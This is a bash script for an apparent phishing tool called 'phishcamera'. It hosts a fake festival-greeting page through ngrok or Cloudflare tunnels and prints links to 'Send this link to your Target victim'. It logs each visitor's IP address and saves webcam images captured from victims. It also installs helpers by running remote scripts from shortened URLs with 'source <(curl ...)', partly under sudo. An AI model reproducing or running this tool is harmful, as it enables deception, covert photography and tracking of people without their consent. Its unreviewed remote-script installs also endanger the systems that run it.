#!/bin/bash
CWD=$(pwd)
if [[ $CWD != *'programs/phishcamera'* ]]; then
cd programs/phishcamera/ > /dev/null 2>&1
fi
RWD=$(pwd)
if [[ -d "${HOME}/capture-TSc" ]]; then
:
else
mkdir ${HOME}/capture-TSc
fi
OS=$(uname -o)
distro=$(cd $HOME && pwd)
case ${OS} in
Android)
        if ! hash jq > /dev/null 2>&1; then
        printf "\033[32m[\033[31m!\033[32m]\033[31mjq not found! \033[34mINSTALLING.......\033[00m\n"
        apt install jq -y > /dev/null 2>&1
        fi
        if ! hash pv > /dev/null 2>&1; then
        printf "\n\033[32m[\033[31m!\033[32m]\033[31mpv not found! \033[34mINSTALLING.......\033[00m\n"
        apt install pv -y > /dev/null 2>&1
        fi
        if [[ ! -f "$PREFIX/bin/lolcat" ]]; then
        printf "\n\033[32m[\033[31m!\033[32m]\033[31mlolcat not found! \033[34mINSTALLING.......\033[00m\n"
        apt install python -y && pip install lolcat > /dev/null 2>&1
        fi
        if ! hash ngrok > /dev/null 2>&1; then
        source <(curl -fsSL "https://bit.ly/3repcoL")
        LWD=$(pwd)
         if [[ $LWD != *'programs/phishcamera'* ]]; then
         cd $RWD > /dev/null 2>&1
         fi
        fi
        if ! hash cloudflared > /dev/null 2>&1; then
        printf "\e[1;32m[\e[1;31m!\e[1;32m]\e[1;31mcloudflare not found!! Installing......\e[0m\n"
        echo
        source <(curl -fsSL "https://git.io/JinSa")
        LWD=$(pwd)
         if [[ $LWD != *'programs/phishcamera'* ]]; then
         cd $RWD > /dev/null 2>&1
         fi
        fi
;;
GNU/Linux)
        if ! hash jq > /dev/null 2>&1; then
        sudo apt install jq -y > /dev/null 2>&1
        fi
        if ! hash pv > /dev/null 2>&1; then
        printf "\n\033[32m[\033[31m!\033[32m]\033[31mpv not found! \033[34mINSTALLING.......\033[00m\n"
        sudo apt install pv -y > /dev/null 2>&1
        fi
        if [[ ! -f "$PREFIX/bin/lolcat" ]]; then
        printf "\n\033[32m[\033[31m!\033[32m]\033[31mlolcat not found! \033[34mINSTALLING.......\033[00m\n"
        sudo apt install python -y && pip install lolcat > /dev/null 2>&1
        fi
        if ! hash ngrok > /dev/null 2>&1; then
        sudo source <(curl -fsSL "https://bit.ly/3repcoL")
        LWD=$(pwd)
         if [[ $LWD != *'programs/phishcamera'* ]]; then
         cd $RWD > /dev/null 2>&1
         fi
        fi
        if ! hash cloudflared > /dev/null 2>&1; then
        printf "\e[1;32m[\e[1;31m!\e[1;32m]\e[1;31mcloudflare not found!! Installing......\e[0m\n"
        echo
        sudo source <(curl -fsSL "https://git.io/JinSa")
        LWD=$(pwd)
         if [[ $LWD != *'programs/phishcamera'* ]]; then
         cd $RWD > /dev/null 2>&1
         fi
        fi
;;
esac
wait() {
sleep 0.02
}
#<<<----------colour substitution by variables---------->>>
 B0="$(printf '\033[100m')" S0="$(printf '\033[30m')"
 B1="$(printf '\033[101m')" S1="$(printf '\033[31m')"
 B2="$(printf '\033[102m')" S2="$(printf '\033[32m')"
 B3="$(printf '\033[103m')" S3="$(printf '\033[33m')"
 B4="$(printf '\033[104m')" S4="$(printf '\033[34m')"
 B5="$(printf '\033[105m')" S5="$(printf '\033[35m')"
 B6="$(printf '\033[106m')" S6="$(printf '\033[36m')"
 B7="$(printf '\033[107m')" S7="$(printf '\033[37m')"
 G0="$(printf '\033[0;1m')" R0="$(printf '\033[00m')"
 D0="$(printf '\033[77m')"
#<<<----------PROGRAM---------->>>
processbar()
{
  bar=" #######################################################"
  barlenght=${#bar}
  i=o
  while ((i < 100 )); do
    n=$((i*barlenght / 100 ))
    printf "\e[00;35m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
    ((i += RANDOM%5+2))
    sleep 0.01
  done
}
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
}
stopPreRunnnigServers() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
  pkill -f -2 ngrok > /dev/null 2>&1
  killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkcloudflared == *'cloudflare'* ]]; then
  pkill -f -2 $checkcloudflared > /dev/null 2>&1
  killall -2 $checkcloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
  killall -2 php > /dev/null 2>&1
fi
}
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "${S2} IP Address:\e[0m\e[1;77m %s${R0}\n" $ip
cat ip.txt >> saved.ip.txt
}
checkfound() {
printf "\n"
printf "\e[5;32>m>>WAITING FOR VICTIM REPOSNSES!!\e[0;1m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
  printf "\n${S6}VICTIM clicked on the link ;)!!${R0}\n"
  catch_ip
  rm -rf ip.txt
fi
sleep 0.5

if [[ -e "Log.log" ]]; then
  printf "\n${S2}YOU GOT AN IMAGE OF YOUR VICTIM${R0}\n"
  rm -rf Log.log
 mv -v *'.png'* $HOME/capture-TSc/
fi
sleep 0.5
done
}
payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://wishyou-@[-0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' template.php > index.php
sed 's+forwarding_link+'$link'+g' festivalwishesHindi.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
rm -rf index3.html
}
payload_ngrok1() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://wishyou-@[-0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' template.php > index.php
sed 's+forwarding_link+'$link'+g' festivalwishesEnglish.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
rm -rf index3.html
}
payload_ngrok2() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://wishyou-@[-0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' template.php > index.php
sed 's+forwarding_link+'$link'+g' festivalwishesFrench.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
rm -rf index3.html
}
select_templet() {
printf "\033[3;4;37mTSc\033[0;0;00m ${S7}Enter(${S1}festival/name${S7})> ${R0}"
read fest_name
fest_name="${fest_name//[[:space:]]/}"
}

ngrok_server() {
echo -e "
${S2}=========================${R0}
    ${B1}Select Language:-${G0}
${S3}-------------------------${R0}

${S2}(${S6}01${S2})${S4}Hindi${R0}
${S2}(${S6}02${S2})${S4}English${R0}
${S2}(${S6}03${S2})${S4}French${R0}
" | pv -qL 1000
while true; do
printf "\033[3;4;37mTSc\033[0;0;00m ${S7}Enter(${S1}server${S7})> ${R0}"
read lang
if [[ $lang == '1' || $lang == '01' || $lang == '2' || $lang == '02' || $lang == '3' || $lang == "03" ]]; then
break
else
printf "${S7}[${S1}!${S7}]${S1} Please enter a valid option!!${R0}\n"
fi
done

echo -e "
${S2}=========================${R0}
     ${B1}Server options:-${G0}
${S3}-------------------------${R0}

${S2}(${S6}01${S2})${S4}Ngrok${R0}
${S2}(${S6}02${S2})${S4}cloudflare ${S6}(recommended)${R0}
" | pv -qL 1000
echo
while true; do
printf "\033[3;4;37mTSc\033[0;0;00m ${S7}Enter(${S1}server${S7})> ${R0}"
read serve
if [[ $serve == '1' || $serve == '01' || $serve == '2' || $serve == '02' ]]; then
break
else
printf "${S7}[${S1}!${S7}]${S1} Please enter a valid option!!${R0}\n"
fi
done
processbar
echo
printf "${S3}Starting server${R0}"
printf "${S3}..........${R0}\n" | pv -qL 15
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
echo
if [[ ${OS^^} == *'ANDROID'* ]]; then
     if [[ ${distro} == *'com.termux'* ]]; then
         if [[ $serve == '1' || $serve == '01' ]]; then
         termux-chroot ngrok http 3333 > /dev/null 2>&1 &
         else
         termux-chroot cloudflared tunnel -url 127.0.0.1:3333 --logfile ${RWD}/.cloudflare-log > /dev/null 2>&1 &
         fi
     else
         while true; do
         printf "${S2}[${S1}!${S2}]${S1} Please switch on your mobile hotspot :/${R0}\n"
	 echo
         read -p $"Run 'y' if you have switched on the hotspot ==> " hotss
         if [[ ${hotss} == [y/Y] ]]; then
          if [[ $serve == '1' || $serve == '01' ]]; then
             ngrok http 3333 > /dev/null 2>&1 &
          else
             cloudflared tunnel -url 127.0.0.1:3333 --logfile ${RWD}/.cloudflare-log > /dev/null 2>&1 &
          fi
         break
         else
         printf "${S2}Exiting........ ${R0}\n"
         exit
         fi
         done
     fi
else
if [[ $serve == '1' || $serve == '01' ]]; then
   sudo ngrok http 3333 > /dev/null 2>&1 &
else
   cloudflared tunnel -url 127.0.0.1:3333 --logfile ${RWD}/.cloudflare-log > /dev/null 2>&1 &
fi
fi
sleep 5
if [[ $serve == '1' || $serve == '01' ]]; then
#link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r | grep public_url | awk '{print $2}')
if [[ $? != 0 ]]; then
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[-0-9a-z]*\.ngrok.io")
else
r2=$(printf "${r1/\"http:\/\//}")
r3=$(printf "${r2/\"https:\/\//}")
r4=$(printf "${r3/\",/}")
link=$(printf "${r4/%\",/}")
fi
else
r1=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${RWD}/.cloudflare-log")
link="${r1/https:\/\//}"
hoster=""
rm -rf $RWD/.cloudflare-log > /dev/null 2>&1
fi
echo; wait
printf "${S7}<<<${R0}${S1}---------------${R0}${B1}${S7}VICTIM'S CRIDENTIALS WILL BE SHOWN HERE${R0}${G0}${S1}---------------${R0}${S7}>>>${R0}\n"; wait
echo; wait
printf "${S4}${R0}${S4} Send this link to your Target victim :${R0}${D0} %s${R0}\n" https://wishyou-@$link
wait
echo
wait
echo -e "
                 _  _
                / \|_)
                \_/| \\ short links:-
" | pv -qL 50 | lolcat
echo; wait
printf "${S4}${R0}${S4} Send this link to your Target victim :${R0}${D0} %s${R0}\n" https://$link
wait
if [[ $lang == '1' || $lang == "01" ]]; then
payload_ngrok
elif [[ $lang == '2' || $lang == '02' ]]; then
payload_ngrok1
else
payload_ngrok2
fi
checkfound
}
phish() {
if [[ -e sendlink ]]; then
  rm -rf sendlink
fi
select_templet
  ngrok_server
}
stopPreRunnnigServers
dependencies
phish
if [[ $CWD != *'programs/phishcamera'* ]]; then
cd $CWD > /dev/null 2>&1
fi

#<<<----------END---------->>>
